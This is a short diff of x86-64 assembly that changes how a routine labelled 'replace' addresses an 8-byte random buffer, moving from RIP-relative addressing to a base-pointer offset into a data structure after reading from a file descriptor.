@@ -63,14 +63,18 @@ replace:
 	syscall
 	mov		r12, rax
 	mov		rdi, r12
-	lea		rsi, [rel randbuf]
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.randbuf
+	;lea		rsi, [rel randbuf]
 	mov		rdx, 8
 	mov		rax, SYS_read
 	syscall
 	mov		rdi, r12
 	mov		rax, SYS_close
 	syscall
-	mov		rax, [rel randbuf]
+	mov		rax, [rbp + 16]
+	add		rax, mydata.randbuf
+	mov		rax, [rax]
 	xor		rdx, rdx
 	NOP
 	NOP
